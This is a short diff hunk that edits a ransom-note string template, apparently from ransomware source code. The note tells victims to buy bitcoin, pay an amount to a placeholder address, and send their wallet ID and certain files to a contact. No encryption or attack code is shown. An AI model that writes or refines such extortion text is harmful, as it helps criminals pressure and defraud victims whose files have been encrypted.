@@ -21,7 +21,7 @@ Please save yourself a couple of hours, by not searching for a decryption servic
 How to get my files back?
 1) Create a Bitcoin wallet (if you don't have one)
 2) Send {0}$ worth of bitcoin to this address: {1}
-3) Send to <b>{2}</b> your Wallet ID and the following files: ""{3}"" + ""{4}"" and DO NOT modify them.
+3) Send to {2} your Wallet ID and the following files: ""{3}"" + ""{4}"" and DO NOT modify them.
 4) Further instructions will come later.
 
 Please do not Modify, Rename or Delete the encrypted files or we might not be able to restore them.";
